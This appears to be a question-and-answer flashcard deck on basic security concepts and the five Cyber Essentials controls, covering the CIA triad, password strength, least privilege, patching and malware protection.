Topic	Question	Answer
Security Basics	Name and define CIA:	1. Confidentiality: Ensures that computer related assets are accessed only by authorized parties. \n2. Integrity: Assets can be modified only by authorized parties or only in authorized ways. \n3. Availability: Assets are accessible to authorized parties at appropiate times.
Security Basics	Name the tools that enforce CIA:	1. Confidentiality: Encryption, Access control, Authentication, Authorization, Physical security. \n2. Integrity: Backups, Checksums, Data correcting codes. \n3. Availability: Physical protections, Computational redundancies.
Security Basics	Briefly describe all 5 of the security properties:	1. Confidentiality: No improper information gathering. \n2. Integrity: Data has not been (maliciously) altered. \n3. Availability: Data/services can be accessed as desired. \n4. Accountability: Actions are traceable to those responsible. \n5. Authentication: User or data origin are accurately identifiable
Security Basics	Name the 10 Steps to Cyber Security:	1. Defining and communicating Risk Management Regime. \n2. Network Security. \n3. Malware Protection. \n4. Monitoring. \n5. Incident Management. \n6. Managing User Priviledges. \n7. Removable Media Controls. \n8. Secure Configuration. \n9. Home and Mobile Working. \n10. User Education and Awareness.
Cyber Essentials	Name the 5 Cyber Security Essentials:	1. Secure configuration. \n2. Boundary firewalls and internet gateways. \n3. Access control and administrative privilege management. \n4. Patch management. \n5. Malware protection.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#1 Secure Configuration:	Want to reduce the level of inherent vulnerabilities in computers and network devices, and have them provide only the services required to fulfil their role. Mainly because default settings are not necessarily secure and predefined passwords tend to be widely known.
Cyber Essentials	State the 5 steps to achieve CSE#1 Secure Configuration:	1. Remove or disable unnecessary user accounts. \n2. Remove or disable unnecessary software. \n3. Remove or disable the auto-run feature. \n4. Change default passwords for user accounts to a strong password. \n5. Enable a personal firewall (or equivalent) on desktop PCs and laptops, and configure it to disable (block) unapproved connections by default.
Cyber Essentials	What constitutes a strong password?	Typically one that has a minimum number of characters in length (e.g. eight characters); differs from the associated username; contains no more than two identical characters in a row; is not a dictionary word; includes a mixture of numeric and alpha characters; has not been reused within a predetermined period of time (e.g. six months); and has not been used for another account.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#2 Boundary firewalls and internet gateways:	Want to protect information, applications and computers within the organization's internal networks against unauthorized access and disclosure from the internet, using boundary firewalls, internet gateways or equivalent network devices. \nBoundary devices are the first line of defense; firewall rules can be used to stop basic attacks before they even reach the internal network.
Cyber Essentials	State the 4 steps to achieve CSE#2 Boundary firewalls and internet gateways:	1. Change default administrator passwords for all network devices and firewalls. \n2. Have each rule that allows network traffic to pass through the firewall be approved by an authorized individual and documented. \n3. Disable (block) unapproved services, or services that are typically vulnerable to attack by default using boundary firewalls. \n4. Remove or disable in a timely manner firewall rules that are no longer required.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#3 Access control and administrative privilege management:	Want to manage effectively and provide the minimum level of access to applications, computers and networks by assigning user accounts, particularly those with special access privileges to authorized individuals.
Cyber Essentials	What is the principle of least priviledge?	Only give users access they need; admin accounts have the most access, if one gets compromised it can lead to large scale loss of information.
Cyber Essentials	State the 7 steps to achieve CSE#3 Access control and administrative privilege management:	1. Subject all user account creation to a provisioning and approval process. \n2. Restrict special access privileges to a limited number of authorized individuals. \n3. Document details about special access privileges, keep them in a secure location and review them on a regular basis. \n4. Use admin accounts only to perform legitimate admin activities, and do not grant them access to email or the internet. \n5. Configure admin accounts to require a password change on a regular basis. \n6. Have each user be authenticated using a unique username and strong password before being granted access to applications, computers and network devices. \n7. Remove or disable user accounts and special access privileges when no longer required or after a pre-defined period of inactivity.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#4 Patch management:	Want to keep software running on computers and network devices up-to-date and have the latest security patches installed. \nVulnerabilities in software are patched through updates; if you don't install the update, the vulnerability is not patched; patching can cause compatibility problems, thus you should always test the patches.
Cyber Essentials	State the 4 steps to achieve CSE#4 Patch management:	1. License and support software running on computers and network devices on the internet to ensure security patches for known vulnerabilities are made available. \n2. Install updates to software running on computers and network devices in a timely manner. \n3. Remove out-of-date software. \n4. Install all security patches for software in a timely manner.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#5 Malware protection:	Want to protect computers exposed to the internet against malware infection through the use of malware protection software. \nTodays firewalls are very good, most malicious software must be invited in by a user opening an email, browsing a compromised website, or connecting compromised media; protection software continuously monitors the computer for known malicious programs.
Cyber Essentials	State the 5 steps to achieve CSE#5 Malware protection:	1. Install anti-malware software on all computers that are connected to or capable of connecting to the internet. \n2. Update anti-malware software on all computers. \n3. Configure anti-malware software to scan files automatically upon access and scan web pages when being accessed. \n4. Regularly scan all files. \n5. Ensure anti-malware software prevents connections to malicious websites on the internet.
Cyber Essentials	How can an institution/person receive the Cyber Essentials Certification?	Through first a self-assessment questionnaire, followed by an external vulnerability scan by an approved tester. The scan comprises of: \n1. External full TCP port and UDP service scan for stated IP range. \n2. Vulnerability scan for stated IP range. \n3. Basic web app scanning for common vulnerabilities.
